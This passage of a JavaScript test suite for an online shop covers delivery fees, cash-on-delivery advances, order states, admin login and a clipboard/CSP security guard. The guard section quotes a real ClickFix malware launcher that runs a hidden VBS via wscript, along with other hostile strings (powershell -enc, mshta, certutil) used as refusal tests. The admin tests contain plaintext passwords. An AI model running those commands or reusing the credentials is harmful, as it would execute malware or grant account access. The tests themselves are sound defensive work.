  t("zones: Karachi is cheaper than Quetta (distance-priced, not one flat fee)", khi < qta, khi + " vs " + qta);
  t("zones: Lahore/Punjab resolves to its own rate", lhr > 0 && lhr !== qta, lhr);
  t("zones: matching is case/spacing tolerant", app.deliveryFeeFor("  karachi ", "sindh") === khi);
  t("zones: an unknown city falls back to the default fee",
    app.deliveryFeeFor("Nowhere Town", "") === Number(app.settings.deliveryFee), app.deliveryFeeFor("Nowhere Town", ""));
  t("zones: province alone is enough to price the order", app.deliveryFeeFor("", "Balochistan") === qta);
  t("zones: admin page exposes the zone editor (city / province / fee)",
    (function(){ app.session = { name: "Admin", role: "owner" }; const d = app.adminRoute("delivery"); return d.includes("Zone rates") && d.includes("dv_fee") && d.includes("editZone"); })());
  t("zones: admin can save a new default fee + free-above threshold",
    (function(){ document.getElementById("dv_fee").value = "249"; document.getElementById("dv_free").value = "5000";
      app.saveDeliveryFee(); return app.settings.deliveryFee === 249 && app.settings.deliveryFreeAbove === 5000; })());
  t("zones: zone fee is stored on the order at checkout time (not recalculated later)", /deliveryZone/.test(src) && /deliveryFee:\s*deliveryFee\(\)|deliveryFee:/.test(src));
  document.getElementById("dv_fee").value = String(app.DEFAULT_SETTINGS.deliveryFee);
  document.getElementById("dv_free").value = "0";
  app.saveDeliveryFee();
}

/* ---------- O: Cash on Delivery + 20% advance lifecycle ---------- */
{
  const src = srcFile("index.html");
  t("cod: checkout offers exactly two payment choices (Advance + COD)",
    (function(){ app.cart = [{ id: app.PRODUCTS.find(p => !p.hidden && p.stock > 0).id, qty: 1 }];
      const h = app.checkout(); return (h.match(/class="pay-opt/g) || []).length >= 2 && /Cash on Delivery/i.test(h) && /Advance/i.test(h); })());
  t("cod: the 20% advance rule is spelled out at checkout", /advance payment zaroori/i.test(app.codRuleHTML ? app.codRuleHTML() : src));
  t("cod: advance % is a business setting (default 20, clamped 0-90)",
    app.codAdvancePct() === 20 && app.DEFAULT_SETTINGS.codAdvancePct === 20);
  t("cod: advance amount is exactly 20% and rounds to a rupee",
    app.codAdvanceAmount(1000) === 200 && app.codAdvanceAmount(999) === Math.round(999 * 0.2));
  t("cod: the rest is due on delivery", app.codDueAmount(1000) === 800);
  const prevUser = app.user;
  app.user = { id: "u-cod", fullName: "Cod Shopper", phone: "03001234567", email: "cod@example.com", walletBalance: 0 };
  t("cod: pending orders show a PENDING label on the customer's order page",
    (function(){ app.orders = [{ id: "COD-1", userId: "u-cod", deliveryPhone: "03001234567", orderStatus: "pending", pm: "cod", total: 1000, advanceAmount: 200, advancePercent: 20, dueOnDelivery: 800, advanceStatus: "unpaid", items: [] }];
      return /PENDING/i.test(app.ordersView()) && /state-chip/i.test(app.ordersView()); })());
  const _tv = app.trackingView("COD-1");
  t("cod: customer tracking page shows the advance still due",
    /Rs\. 200\.00/.test(_tv) && /advance/i.test(_tv) && /baqi/.test(_tv), _tv.slice(200, 900));
  app.user = prevUser;
  t("cod: admin cannot confirm before the advance is marked paid",
    (function(){ app.session = { name: "Admin", role: "owner" };
      app.orders = [{ id: "COD-2", orderStatus: "pending", pm: "cod", total: 1000, advanceAmount: 200, advancePercent: 20, dueOnDelivery: 800, advanceStatus: "unpaid", items: [] }];
      app.confirmCodOrderAdmin("COD-2");
      const stillPending = app.orders[0].orderStatus === "pending";
      app.markAdvancePaid("COD-2");
      const marked = app.orders[0].advanceStatus === "paid";
      app.confirmCodOrderAdmin("COD-2");
      return stillPending && marked && app.orders[0].orderStatus === "confirmed"; })());
  t("cod: confirming stamps confirmedAt for the audit trail", !!app.orders[0].confirmedAt);
  t("cod: admin orders page explains the whole flow + has Advance Paid / Confirm / Days buttons",
    (function(){ app.session = { name: "Admin", role: "owner" };
      app.orders = [{ id: "COD-3", orderStatus: "pending", pm: "cod", total: 2000, advanceAmount: 400, advancePercent: 20,
        dueOnDelivery: 1600, advanceStatus: "unpaid", items: [], deliveryName: "Ali", deliveryPhone: "03001234567", deliveryCity: "Karachi" }];
      const h = app.adminOrders();
      return /markAdvancePaid/.test(h) && /confirmCodOrderAdmin/.test(h) && /setOrderTimeline/.test(h) && /20% advance/i.test(h); })());
  t("cod: admin orders page shows the advance amount + what is still due on delivery",
    (function(){ const h = app.adminOrders(); return /400/.test(h) && /1,?600|1600/.test(h); })());
  t("cod: server accepts cod as a payment method (place_order_secure already allows it)",
    /'cod'|"cod"/.test(srcFile("supabase_backend_v2.sql")));
  app.orders = [];
}

/* ---------- P: delivery timeline countdown + exception states ---------- */
{
  const src = srcFile("index.html");
  const today = new Date();
  app.orders = [{ id: "ETA-1", orderStatus: "confirmed", pm: "cod", total: 500, items: [],
    advanceStatus: "paid", confirmedAt: today.toISOString().slice(0, 10) }];
  const eta = app.setOrderEtaDays(app.orders[0], 5);
  t("eta: admin sets the number of days (e.g. 5) and an ETA date is stored",
    app.orders[0].etaDays === 5 && !!app.orders[0].etaDate && eta === app.orders[0].etaDate, app.orders[0].etaDate);
  t("eta: customer sees a 5-day countdown", app.orderEtaDays(app.orders[0]) === 5, app.orderEtaDays(app.orders[0]));
  t("eta: countdown box renders on the order + tracking pages",
    /eta-box/.test(app.trackingView("ETA-1")) && /5/.test(app.etaBoxHTML(app.orders[0])));
  app.orders[0].etaDate = new Date(Date.now() - 3 * 864e5).toISOString().slice(0, 10);
  t("eta: the counter drops day by day and goes negative when late", app.orderEtaDays(app.orders[0]) === -3, app.orderEtaDays(app.orders[0]));
  t("eta: an overdue CONFIRMED order sweeps itself to DELAY",
    app.sweepOrderTimelines() === true && app.orderState(app.orders[0]) === "delayed", app.orderState(app.orders[0]));
  t("eta: the sweep writes a reason the customer can read", /delay/i.test(app.orders[0].statusNote || ""), app.orders[0].statusNote);
  t("eta: a delivered/received order is never swept to DELAY",
    (function(){ app.orders = [{ id: "ETA-2", orderStatus: "received", etaDate: new Date(Date.now() - 864e5).toISOString().slice(0, 10), items: [] }];
      app.sweepOrderTimelines(); return app.orderState(app.orders[0]) === "received"; })());
  t("states: every state the owner asked for exists",
    ["pending","confirmed","in_transit","delayed","error","damaged","received"].every(s => app.ORDER_STATES.includes(s)), app.ORDER_STATES.join(","));
  t("states: labels are human (DELAY / ERROR / DAMAGED / ORDER RECEIVED)",
    /DELAY/i.test(app.stateLabel({ orderStatus: "delayed" })) && /ERROR/i.test(app.stateLabel({ orderStatus: "error" })) &&
    /DAMAGED|KHARAB/i.test(app.stateLabel({ orderStatus: "damaged" })) && /RECEIVED/i.test(app.stateLabel({ orderStatus: "received" })));
  t("states: legacy statuses map onto the new lifecycle (old orders still read correctly)",
    app.orderState({ orderStatus: "processing" }) === "confirmed" && app.orderState({ orderStatus: "shipped" }) === "in_transit" &&
    app.orderState({ orderStatus: "delivered" }) === "received");
  t("states: a chip never relies on colour alone (text label + icon)",
    /state-chip/.test(app.stateChip({ orderStatus: "error" })) && /[A-Z]{3,}/.test(app.stateChip({ orderStatus: "error" })));
  t("states: the customer stepper shows PENDING → CONFIRMED → ON THE WAY → RECEIVED",
    app.FLOW_STEPS.join(">") === "pending>confirmed>in_transit>received", app.FLOW_STEPS.join(">"));
  t("states: an exception (DELAY/ERROR/DAMAGED) is called out on the stepper",
    /DELAY|ERROR|DAMAGED/i.test(app.flowHTML({ orderStatus: "damaged", items: [] })));
  app.orders = [];
}

/* ---------- Q: admin credentials (Admin + Avinash) ---------- */
{
  const crypto = require("crypto");
  const sha = w => crypto.createHash("sha256").update(w, "utf8").digest("hex");
  t("admin: owner username is Admin", app.ADMIN_USER === "Admin", app.ADMIN_USER);
  t("admin: Admin / Admin1. logs in as owner", (app.tryLogin("Admin", "Admin1.") || {}).role === "owner");
  t("admin: username is case-insensitive (admin / ADMIN both work)",
    !!app.tryLogin("admin", "Admin1.") && !!app.tryLogin("ADMIN", "Admin1."));
  t("admin: wrong password is rejected", app.tryLogin("Admin", "Admin1") === null && app.tryLogin("Admin", "wrong") === null);
  t("admin: Avinash / Avinash1. logs in with admin access", (app.tryLogin("Avinash", "Avinash1.") || {}).role === "admin");
  t("admin: Avinash is a built-in member (cannot be deleted by another admin)",
    app.BUILTIN_TEAM.some(m => m.name === "Avinash" && m.builtin === true));
  t("admin: only SHA-256 hashes ship in the bundle — never the plaintext words",
    app.ADMIN_HASH === sha("Admin1.") && app.BUILTIN_TEAM.find(m => m.name === "Avinash").pass === sha("Avinash1.") &&
    !/Admin1\.|Avinash1\./.test(srcFile("index.html")));
  t("admin: Avinash can reach the orders + delivery pages",
    (function(){ app.session = { name: "Avinash", role: "admin" };
      return app.adminRoute("orders").includes("Orders") && !app.adminRoute("delivery").includes("No access"); })());
  t("admin: login is rate-limited (5 wrong tries locks the username)",
    (function(){ app.session = null;
      document.getElementById("a_user").value = "locktest"; document.getElementById("a_pass").value = "nope";
      for (let i = 0; i < 5; i++) app.adminLogin();
      const st = app.loginLockState("locktest");
      return st.until > Date.now(); })());
  t("admin: /admin opens the panel (vercel rewrite + boot hash jump)",
    /"source":\s*"\/admin"/.test(srcFile("vercel.json")) && /\/admin\$\/i\.test\(path\)/.test(srcFile("index.html")));
  _ls.delete("nukto.loginLock");
  app.session = { name: "Admin", role: "owner" };
}

/* ---------- R: checkout popup + order record ---------- */
{
  const src = srcFile("index.html");
  t("checkout: a review popup stands between the form and the order (was missing)",
    /function reviewOrderPopup/.test(src) && /confirmReviewPopup/.test(src));
  t("checkout: the popup validates name / phone / email / address before ordering",
    (function(){ const h = app.reviewOrderPopup ? String(app.reviewOrderPopup) : ""; return /dname|deliveryName|name/i.test(h) && /phone/i.test(h) && /email/i.test(h); })());
  t("checkout: collects email + postal code (owner asked for full customer info)",
    (function(){ app.cart = [{ id: app.PRODUCTS.find(p => !p.hidden && p.stock > 0).id, qty: 1 }];
      const h = app.checkout(); return /id="demail"/.test(h) && /id="dpost"/.test(h); })());
  t("checkout: address survives a re-render (draft in localStorage)", /nukto\.checkoutDraft/.test(src));
  t("checkout: city + province pickers drive the zone fee live", /id="dcity"/.test(src) && /id="dprov"/.test(src) && /onAddrInput/.test(src));
  t("checkout: COD orders are created PENDING with advance + due amounts recorded",
    /advanceStatus/.test(src) && /dueOnDelivery/.test(src) && /advanceAmount/.test(src));
  t("checkout: confirmation page shows state chip, stepper, ETA and COD amounts",
    (function(){ app.user = { id: "u-conf", fullName: "Conf Shopper", phone: "03007654321", email: "conf@example.com" };
      app.orders = [{ id: "CONF-1", userId: "u-conf", deliveryPhone: "03007654321", orderStatus: "confirmed", pm: "cod", total: 1000, advanceAmount: 200,
        advancePercent: 20, dueOnDelivery: 800, advanceStatus: "paid", etaDays: 5,
        etaDate: new Date(Date.now() + 5 * 864e5).toISOString().slice(0, 10), items: [], deliveryName: "Test", deliveryCity: "Karachi" }];
      const h = app.confirmation("CONF-1");
      return /state-chip/.test(h) && /flow/.test(h) && /eta-box/.test(h) && /200/.test(h); })());
  t("orders: an order pushed to Supabase carries the new lifecycle columns",
    /pay_mode|advance_percent|eta_date/.test(String(app.pushCloudOrder)));
  app.orders = [];
}

/* ---------- S: runtime security guard + CSP + externalised scripts ---------- */
/* Written for the 2026-10-28 ClickFix / fake-Turnstile incident report (INCIDENT.md). */
{
  const rawHtml = fs.readFileSync(path.join(__dirname, "..", "index.html"), "utf8");
  const vercelCfg = JSON.parse(srcFile("vercel.json"));
  const allHeaders = (vercelCfg.headers || []).flatMap(h => h.headers.map(x => [x.key.toLowerCase(), x.value]));
  const hdr = k => (allHeaders.find(([key]) => key === k.toLowerCase()) || [])[1] || "";
  const INCIDENT_CMD = 'cmd /d /q /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf==218624 ren "%f" rt.vbs & wscript "%~dpf\\rt.vbs"';

  /* --- S1: domain allow-list --- */
  t("guard: nukto.shop and www.nukto.shop are allowed",
    app.nuktoHostAllowed("nukto.shop") && app.nuktoHostAllowed("www.nukto.shop"));
  t("guard: every *.vercel.app preview host is allowed",
    app.nuktoHostAllowed("realonenukto-psgzwz5sg-genieotps-projects.vercel.app") &&
    app.nuktoHostAllowed("maneshkumarcommissionagent-maneshku.vercel.app"));
  t("guard: the canonical dpdns.org host and Arena previews are allowed",
    app.nuktoHostAllowed("maneshkumarcommissionagent.dpdns.org") && app.nuktoHostAllowed("8080-abc123.e2b.app"));
  t("guard: local development hosts are allowed",
    app.nuktoHostAllowed("localhost") && app.nuktoHostAllowed("127.0.0.1") &&
    app.nuktoHostAllowed("192.168.0.10") && app.nuktoHostAllowed(""));
  t("guard: lookalike domains are refused (suffix must match a dot boundary)",
    !app.nuktoHostAllowed("nukto.shop.evil.com") && !app.nuktoHostAllowed("evil-nukto.shop") &&
    !app.nuktoHostAllowed("notvercel.app") && !app.nuktoHostAllowed("vercel.app.evil.io") &&
    !app.nuktoHostAllowed("maneshkumarcommissionagent.dpdns.org.evil.net"),
    app.NUKTO_HOST_SUFFIXES.join(","));
  t("guard: an unrelated public domain is refused", !app.nuktoHostAllowed("example.com"));

  const savedHost = location.hostname, savedSec = localStorage.getItem("nukto.security");
  location.hostname = "nukto.shop";
  t("guard: hostGuard() lets the store run on an owned domain", app.hostGuard() === true);
  location.hostname = "nukto-shop-clone.ru";
  localStorage.removeItem("nukto.security");
  t("guard: hostGuard() refuses to run on a clone domain", app.hostGuard() === false);
  const secLog = JSON.parse(localStorage.getItem("nukto.security") || "[]");
  t("guard: a refused host is logged to nukto.security for the admin dashboard",
    secLog.length === 1 && /host-refused/.test(secLog[0]) && /nukto-shop-clone\.ru/.test(secLog[0]), secLog[0]);
  location.hostname = savedHost;
  if(savedSec === null) localStorage.removeItem("nukto.security"); else localStorage.setItem("nukto.security", savedSec);

  /* --- S2: injected-node allow-list --- */
  t("guard: same-origin scripts (app.js, catalog.js) are allowed",
    app.nuktoSrcAllowed("app.js") && app.nuktoSrcAllowed("/catalog.js") && app.nuktoSrcAllowed("./x.js"));
  t("guard: Supabase REST/Edge-Function calls and the media CDNs are allowed",
    app.nuktoSrcAllowed("https://vneknnmhnbkltkhihbok.supabase.co/functions/v1/checkout") &&
    app.nuktoSrcAllowed("https://hhcnewapp.blr1.cdn.digitaloceanspaces.com/a.jpg") &&
    app.nuktoSrcAllowed("https://hhcdropshipping.b-cdn.net/v.mp4"));
  t("guard: a foreign script/frame src is refused",
    !app.nuktoSrcAllowed("https://cdn.evil.tld/x.js") && !app.nuktoSrcAllowed("//evil.tld/x.js") &&
    !app.nuktoSrcAllowed("https://supabase.co.evil.net/x.js"));
  t("guard: javascript:/data:/vbscript: URLs are refused outright",
    !app.nuktoSrcAllowed("javascript:alert(1)") && !app.nuktoSrcAllowed("data:text/html,<script>x</script>") &&
    !app.nuktoSrcAllowed("vbscript:msgbox(1)"));
  t("guard: the injection watcher is armed during boot()",
    /if\(!hostGuard\(\)\) return;[\s\S]{0,220}startInjectionWatch\(\);[\s\S]{0,80}lockClipboard\(\);/.test(appJs));

  /* --- S3: clipboard assertion (the exact ClickFix payload) --- */
  const savedClip = navigator.clipboard;
  let clipWrites = [];
  navigator.clipboard = { writeText: v => { clipWrites.push(String(v)); return Promise.resolve(); } };
  localStorage.removeItem("nukto.security");
  t("guard: the incident command is recognised as a Windows launcher", app.NUKTO_CMD_PATTERN.test(INCIDENT_CMD));
  t("guard: safeCopyText() refuses the incident command", app.safeCopyText(INCIDENT_CMD) === false);
  t("guard: the refused command never reaches navigator.clipboard.writeText", clipWrites.length === 0, clipWrites.join("|"));
  const secLog2 = JSON.parse(localStorage.getItem("nukto.security") || "[]");
  t("guard: the refused clipboard write is reported", /clipboard-refused/.test(secLog2[0] || ""), secLog2[0]);
  ["powershell -enc AAAA", "wscript C:\\x\\rt.vbs", "mshta http://evil/x.hta", "certutil -urlcache -f",
   "schtasks /create", "%LOCALAPPDATA%\\Google\\Chrome\\User Data"].forEach(bad => {
    t("guard: refuses " + bad.slice(0, 26), app.safeCopyText(bad) === false);
  });
  t("guard: a normal payment copy still works (no false positive)",
    app.safeCopyText("03420286170 | Amount Rs. 5200") === true && clipWrites[clipWrites.length - 1] === "03420286170 | Amount Rs. 5200");
  clipWrites = [];
  app.copyPay("03420286170", 5200);
  t("orders: the 'copy payment details' button still copies the account + amount",
    clipWrites.length === 1 && /03420286170/.test(clipWrites[0]) && /5200/.test(clipWrites[0]), clipWrites[0]);
  const stubWrite = navigator.clipboard.writeText;
  const writesBeforeLock = clipWrites.length;
  app.lockClipboard();
  t("guard: lockClipboard() replaces navigator.clipboard.writeText with the filtered version",
    navigator.clipboard.writeText !== stubWrite);
  let rawRejected = null;
  const p = navigator.clipboard.writeText(INCIDENT_CMD);
  p.then(() => { rawRejected = false; }, () => { rawRejected = true; });
  t("guard: even code we did not write cannot put a command on the clipboard",
    clipWrites.length === writesBeforeLock && !!p && typeof p.then === "function",
    "writes=" + clipWrites.length);
  const p2 = navigator.clipboard.writeText("03420286170 | Amount Rs. 999");
  p2.then(() => {}, () => {});
  t("guard: the locked clipboard still copies legitimate text",
    clipWrites[clipWrites.length - 1] === "03420286170 | Amount Rs. 999");
  navigator.clipboard = savedClip;
  localStorage.removeItem("nukto.security");

  /* --- S4: the app ships no dynamic-code / exfiltration primitives --- */
  const codeLines = appJs.split("\n").filter(l => !/^\s*(\*|\/\*|\/\/)/.test(l));  // skip comments
  const onlyGuardPattern = (re, label) => {
    const lines = codeLines.filter(l => re.test(l));
    t("guard: app.js never uses " + label + " (only the guard's own detection pattern may match)",
      lines.length <= 1 && lines.every(l => /NUKTO_CMD_PATTERN|new\\s\+Function|importScripts\\s\*\(/.test(l)),
      lines.length + " line(s): " + lines.map(l => l.trim().slice(0, 60)).join(" | "));
  };
  onlyGuardPattern(/(?<![\w.\\])eval\s*\(/, "eval()");
  onlyGuardPattern(/document\.write\s*\(/, "document.write()");
  onlyGuardPattern(/(?<![\w.\\])atob\s*\(/, "atob()");
  onlyGuardPattern(/importScripts\s*\(/, "importScripts()");
  t("guard: app.js has no new Function(), sendBeacon, WebSocket or EventSource",
    !/new\s+Function\s*\(/.test(appJs) && !/sendBeacon/.test(appJs) &&
    !/new\s+WebSocket/.test(appJs) && !/EventSource/.test(appJs));
  t("guard: the unguarded clipboard call is gone", !/writeText\(txt\)\.then/.test(appJs));

  /* --- S5: cookie consent may only touch localStorage + UI (task 3d) --- */
  const consentFn = (appJs.match(/function cookieConsent\([\s\S]*?\n}/) || [""])[0];
  t("consent: cookieConsent() exists and is small", consentFn.length > 40 && consentFn.length < 900, consentFn.length);
  t("consent: no fetch, script injection, popup, iframe or clipboard anywhere in the consent path",
    !/fetch\(|createElement|appendChild|window\.open|clipboard|writeText|iframe|eval|XMLHttpRequest|sendBeacon/.test(consentFn),
    consentFn.slice(0, 200));
  let consentFetches = 0;
  const savedHandler = __fetchHandler;
  __fetchHandler = (url, opts) => { consentFetches++; return Promise.resolve({ ok: false, status: 0, json: () => Promise.resolve([]) }); };
  const savedConsent = localStorage.getItem("nukto.consent");
  try { app.cookieConsent(true); } catch(e) {}
  __fetchHandler = savedHandler;
  t("consent: accepting cookies performs zero network requests synchronously", consentFetches === 0, consentFetches);
  t("consent: accepting cookies records the choice in nukto.consent",
    JSON.parse(localStorage.getItem("nukto.consent") || "null") !== null);
  if(savedConsent === null) localStorage.removeItem("nukto.consent"); else localStorage.setItem("nukto.consent", savedConsent);

  /* --- S6: externalised scripts (task 3b) --- */
  const inlineBlocks = [...rawHtml.matchAll(/<script(?![^>]*src)(?![^>]*ld\+json)[^>]*>([\s\S]*?)<\/script>/g)].map(m => m[1]);
  t("scripts: exactly one inline <script> is left in index.html (the pre-paint theme bootstrap)",
    inlineBlocks.length === 1, inlineBlocks.length);
  t("scripts: that bootstrap is tiny and contains no network, eval or DOM injection",
    inlineBlocks[0].split("\n").length < 40 &&
    !/fetch\(|eval\(|new\s+Function|document\.write|atob\(|createElement\("script"|innerHTML/.test(inlineBlocks[0]));
  const extScripts = [...rawHtml.matchAll(/<script[^>]*src="([^"]+)"[^>]*>/g)].map(m => m[0]);
  t("scripts: every external script is same-origin and relative (app.js, catalog.js)",
    extScripts.length === 2 && extScripts.every(tag => /src="(app|catalog)\.js"/.test(tag)), extScripts.join(" "));
  t("scripts: no external script carries defer/async surprises or a third-party host",
    !/src="https?:/.test(rawHtml) && !/<script[^>]*src="[^"]*"[^>]*async/.test(rawHtml));
  t("scripts: app.js is referenced after catalog.js and before </body>",
    rawHtml.indexOf('src="catalog.js"') < rawHtml.indexOf('src="app.js"') &&
    rawHtml.indexOf('src="app.js"') < rawHtml.indexOf("</body>"));
  const strictAt = appJs.indexOf('"use strict";');
  t("scripts: app.js is strict mode from its first statement and contains the app",
    strictAt > -1 && strictAt < appJs.indexOf("const FALLBACK=") &&
    !/\}\;\s*\n\s*"use strict";/.test(appJs) && /function boot\(\)/.test(appJs) && appJs.length > 200000,
    "directive at char " + strictAt);

  /* --- S7: CSP + security headers (task 3a) --- */
  const csp = hdr("content-security-policy");
  t("csp: a Content-Security-Policy header is configured in vercel.json", csp.length > 80, csp.slice(0, 90));
  [["default-src", "'self'"], ["base-uri", "'self'"], ["object-src", "'none'"], ["frame-src", "'none'"],
   ["script-src", "'self' 'unsafe-inline'"], ["style-src", "'self' 'unsafe-inline'"],
   ["font-src", "'self' data:"], ["form-action", "'self'"], ["worker-src", "'self'"]].forEach(([dir, val]) => {
    t("csp: " + dir + " is " + val, csp.includes(dir + " " + val), csp);
  });
  t("csp: frame-ancestors and upgrade-insecure-requests are present",
    /frame-ancestors\s+'self'/.test(csp) && /upgrade-insecure-requests/.test(csp));
  t("csp: connect-src allows Supabase (REST + Edge Functions + realtime) and Brevo only",
    /connect-src[^;]*https:\/\/vneknnmhnbkltkhihbok\.supabase\.co/.test(csp) &&
    /connect-src[^;]*wss:\/\/vneknnmhnbkltkhihbok\.supabase\.co/.test(csp) &&
    /connect-src[^;]*https:\/\/api\.brevo\.com/.test(csp) &&
    !/connect-src[^;]*\*/.test(csp), (csp.match(/connect-src[^;]*/) || [""])[0]);
  const mediaHosts = ["hhcnewapp.blr1.cdn.digitaloceanspaces.com", "hhcnewapp.blr1.digitaloceanspaces.com", "hhcdropshipping.b-cdn.net"];
  t("csp: img-src covers every host the catalog actually uses",
    mediaHosts.every(h => new RegExp("img-src[^;]*" + h.replace(/\./g, "\\.")).test(csp)));
  t("csp: media-src exists and covers the product-video hosts (otherwise videos break)",
    /media-src/.test(csp) && mediaHosts.every(h => new RegExp("media-src[^;]*" + h.replace(/\./g, "\\.")).test(csp)));
  t("csp: no wildcard source and no unsafe-eval", !/\s\*\s/.test(csp) && !/unsafe-eval/.test(csp));
  t("csp: the TODO to drop 'unsafe-inline' is documented next to the inline bootstrap",
    /SECURITY \/ CSP TODO/.test(rawHtml) && /sha256-/.test(rawHtml) &&
    rawHtml.indexOf("SECURITY / CSP TODO") < rawHtml.indexOf("NO-FLASH THEME BOOT"));
  t("headers: HSTS is 2 years with includeSubDomains + preload",
    /max-age=63072000/.test(hdr("strict-transport-security")) &&
    /includeSubDomains/.test(hdr("strict-transport-security")) && /preload/.test(hdr("strict-transport-security")),
    hdr("strict-transport-security"));
  t("headers: nosniff, X-Frame-Options SAMEORIGIN and a Referrer-Policy are set",
    hdr("x-content-type-options") === "nosniff" && hdr("x-frame-options") === "SAMEORIGIN" &&
    hdr("referrer-policy") === "strict-origin-when-cross-origin");
  t("headers: Cross-Origin-Opener-Policy same-origin is set", hdr("cross-origin-opener-policy") === "same-origin");
  t("headers: Permissions-Policy disables the dangerous browser features",
    /geolocation=\(\)/.test(hdr("permissions-policy")) && /camera=\(\)/.test(hdr("permissions-policy")) &&
    /microphone=\(\)/.test(hdr("permissions-policy")) && /payment=\(\)/.test(hdr("permissions-policy")),
    hdr("permissions-policy"));
  t("headers: the /admin rewrites and the catalog.js cache rule survived the CSP merge",
    (vercelCfg.rewrites || []).some(r => r.source === "/admin" && /index\.html/.test(r.destination)) &&
    (vercelCfg.headers || []).some(h => h.source === "/catalog.js"));
}


console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
})();
